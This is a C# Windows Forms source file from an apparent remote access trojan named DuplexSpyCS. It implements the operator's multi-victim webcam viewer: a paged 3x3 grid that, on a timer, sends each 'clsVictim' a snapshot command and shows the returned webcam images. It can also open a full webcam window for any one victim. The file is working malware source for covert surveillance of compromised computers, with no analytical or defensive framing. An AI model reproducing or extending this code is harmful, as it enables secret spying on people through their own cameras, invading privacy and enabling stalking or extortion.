using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace DuplexSpyCS
{
    public partial class frmMultiWebcam : Form
    {
        private int idx_page = 1;
        public List<clsVictim> l_victim;

        public frmMultiWebcam()
        {
            InitializeComponent();
        }

        void AllClear()
        {
            for (int i = 0; i < 9; i++)
            {
                PictureBox pb = (PictureBox)tableLayoutPanel1.Controls[i];
                pb.Image = Resources.Resource.NoSignal;
            }
        }

        void Req_Snapshot()
        {
            int idx_start = (idx_page - 1) * 9;
            for (int i = 0; i < 9 && idx_start + i < l_victim.Count; i++)
            {
                //int nRow = i / 3;
                //int nCol = i % 3;
                int nIdx = idx_start + i;
                clsVictim v = l_victim[nIdx];
                v.SendCommand("webcam|snapshot|0|monitor");
            }
        }

        void setup()
        {
            int idx = 0;
            for (int i = 0; i < tableLayoutPanel1.RowCount; i++)
            {
                for (int j = 0; j < tableLayoutPanel1.ColumnCount; j++)
                {
                    PictureBox pb = new PictureBox()
                    {
                        Dock = DockStyle.Fill,
                        BackColor = Color.Black,
                        SizeMode = PictureBoxSizeMode.Zoom,
                        Tag = idx,
                    };
                    tableLayoutPanel1.Controls.Add(pb, j, i);
                    pb.MouseDoubleClick += pb_MouseDoubleClick;

                    pb.Image = Resources.Resource.NoSignal;

                    idx++;
                }
            }

            timer2.Start();
        }

        private void frmMultiWebcam_Load(object sender, EventArgs e)
        {
            setup();
        }

        private void pb_MouseDoubleClick(object sender, MouseEventArgs e)
        {
            PictureBox pb = (PictureBox)sender;
            if (pb.Tag != null)
            {
                int idx = (int)pb.Tag;
                int idx_start = (idx_page - 1) * 9;

                if (idx + idx_start < l_victim.Count)
                {
                    clsVictim v = l_victim[idx + idx_start];
                    frmWebcam f = clsTools.fnFindForm<frmWebcam>(v);
                    if (f == null)
                    {
                        f = new frmWebcam(v);
                        f.Show();
                    }
                    else
                    {
                        f.BringToFront();
                    }
                }
            }
        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            Req_Snapshot();
        }

        //Start
        private void toolStripButton2_Click(object sender, EventArgs e)
        {
            timer1.Start();

        }
        //Stop
        private void toolStripButton5_Click(object sender, EventArgs e)
        {
            timer1.Stop();

        }
        //SnapShot
        private void toolStripButton1_Click(object sender, EventArgs e)
        {
            Req_Snapshot();
        }

        //Previous Page
        private void toolStripButton3_Click(object sender, EventArgs e)
        {
            if (idx_page - 1 > 0)
            {
                AllClear();
                idx_page--;
            }
        }
        //Next Page
        private void toolStripButton4_Click(object sender, EventArgs e)
        {
            int idx_start = idx_page * 9;
            if (idx_start <= l_victim.Count)
            {
                AllClear();
                idx_page++;
            }
        }

        private void timer2_Tick(object sender, EventArgs e)
        {
            int idx_start = (idx_page - 1) * 9;
            for (int i = 0; i < 9 && idx_start + i < l_victim.Count; i++)
            {
                //int nRow = i / 3;
                //int nCol = i % 3;
                int nIdx = idx_start + i;
                clsVictim v = l_victim[nIdx];
                PictureBox pb = (PictureBox)tableLayoutPanel1.Controls[i];
                if (v.img_LastWebcam != null)
                    pb.Image = v.img_LastWebcam;
            }
        }
    }
}
